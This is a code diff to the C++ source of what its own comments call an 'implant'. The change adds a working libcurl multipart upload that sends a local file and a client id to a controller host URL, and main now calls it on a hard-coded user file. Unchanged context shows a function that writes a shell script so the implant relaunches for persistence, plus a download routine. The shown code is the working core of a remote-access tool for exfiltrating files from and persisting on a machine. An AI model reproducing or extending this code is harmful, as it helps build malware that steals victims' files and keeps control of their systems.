@@ -110,66 +110,67 @@ void download_file(string url, string location) {
     }
 }
 
-static size_t read_data_file(void *ptr, size_t size, size_t nmemb, FILE *stream) {
-    curl_off_t nread;
-    size_t retcode = fread(ptr, size, nmemb, stream);
-    nread = (curl_off_t)retcode;
-    return retcode;
-}
-
-
-void upload_file(string url, string location) {
-    //Shell method
-    //exec("curl -X POST '" + url + "' --data '@" + location + "'");
-
-    //CURL Method
-    /*CURL *curl = curl_easy_init();
-    FILE *fp;
+void upload_file(string url, string location, string id) {
+    CURL *curl;
     CURLcode res;
-    struct stat file_info;
-    curl_off_t fsize;
 
-    string fileType = location;
-    size_t idx;
+    curl_mime *form = NULL;
+    curl_mimepart *field = NULL;
+    struct curl_slist *headerlist = NULL;
+    static const char buf[] = "Expect:";
 
-    idx = fileType.find(".");
+    curl_global_init(CURL_GLOBAL_ALL);
 
-    string result = fileType.substr(idx+1);
+    curl = curl_easy_init();
+    if(curl) {
+        /* Create the form */
+        form = curl_mime_init(curl);
 
-    if(result == "txt")
-        result = "text/plain";
+        /* Fill in the client ID field */
+        field = curl_mime_addpart(form);
+        curl_mime_name(field, "id");
+        curl_mime_data(field, id.c_str(), CURL_ZERO_TERMINATED);
 
-    struct curl_slist *headers = NULL;
+        /* Fill in the file upload field */
+        field = curl_mime_addpart(form);
+        curl_mime_name(field, "file");
+        curl_mime_filedata(field, location.c_str());
 
-    string contentType = "Content-Type: " + result;
+        /* Fill in the filename field */
+        field = curl_mime_addpart(form);
+        curl_mime_name(field, "filename");
+        curl_mime_data(field, location.c_str(), CURL_ZERO_TERMINATED);
 
-    headers = curl_slist_append(headers, contentType.c_str());
+        /* Fill in the submit field too, even if this is rarely needed */
+        field = curl_mime_addpart(form);
+        curl_mime_name(field, "submit");
+        curl_mime_data(field, "send", CURL_ZERO_TERMINATED);
 
-    fp = fopen(location.c_str(), "rb");
-    if(!fp)
-        return;
-
-    if(fstat(fileno(fp), &file_info) != 0)
-        return;
-
-    if (curl) {
-        //curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_data_file);
-        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-
-        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
+        /* initialize custom header list (stating that Expect: 100-continue is not
+             wanted */
+        headerlist = curl_slist_append(headerlist, buf);
+        /* what URL that receives this POST */
         curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-        
-        curl_easy_setopt(curl, CURLOPT_READDATA, fp);
+        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
 
-        curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, (curl_off_t)file_info.st_size);
-        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
-        curl_easy_perform(curl);
+        /* Perform the request, res will get the return code */
+        res = curl_easy_perform(curl);
+        /* Check for errors */
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n",
+                            curl_easy_strerror(res));
+
+        /* always cleanup */
         curl_easy_cleanup(curl);
-        fclose(fp);
-    }*/
+
+        /* then cleanup the form */
+        curl_mime_free(form);
+        /* free slist */
+        curl_slist_free_all(headerlist);
+    }
 }
 
-void make_shell_persistance(){
+void make_shell_persistance() {
     //Create shell script to launch implant
     string file_path = "'" + exec("readlink -f a.out") + "'";
     string shellfile = "#! /bin/sh\n" + file_path;
@@ -207,8 +208,8 @@ int main() {
         this_thread::sleep_for(chrono::seconds(3));
     }
 
-    //Local file test
-    //upload_file(HOST_URL + "fileupload", "/home/davidpruitt/Desktop/Files/text.txt");
+    // Local file test
+    upload_file(HOST_URL + "upload", "/home/brett/0.jpg", id);
 
 
     while (true) {
